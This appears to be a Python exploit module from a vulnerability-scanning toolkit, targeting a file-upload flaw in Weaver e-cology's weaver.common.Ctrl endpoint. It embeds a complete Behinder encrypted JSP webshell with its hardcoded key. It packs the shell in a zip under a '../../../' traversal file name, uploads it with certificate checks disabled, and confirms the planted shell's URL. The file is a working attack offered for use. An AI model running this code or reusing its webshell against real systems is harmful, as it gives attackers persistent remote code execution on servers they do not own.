import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3
import zipfile


urllib3.disable_warnings()

def file_zip(mm, webshell_name2):
    shell = """<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    """  ## 替换shell内容
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)


def GetShell(urllist):
    mm = 'GyBtVQDJ'
    webshell_name1 = mm + '.jsp'
    webshell_name2 = '../../../' + webshell_name1

    file_zip(mm, webshell_name2)
    # print(Vcolors.RED + "[+] 上传文件中#23333333333333\r" + Vcolors.ENDC)
    urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    try:
        requests.post(url=urls, files=file, timeout=10, verify=False)
        GetShellurl = urllist + 'cloudstore/' + webshell_name1
        GetShelllist = requests.get(url=GetShellurl, timeout=10, verify=False)
        if GetShelllist.status_code == 200:
            print(Vcolors.RED + "[+] 利用成功默认冰蝎webshell地址为:\r" + GetShellurl + Vcolors.ENDC)
            return 'ok'
        else:
            print(Vcolors.WARNING + "[x] 不存在Weaver_Common_Ctrl_Upload漏洞" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {urllist} 存在未知错误！\n", e)
        logging.error("Weaver_Common_Ctrl_Upload脚本出现异常")



def Weaver_Common_Ctrl_Upload(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    GetShell(urldata)


  
        


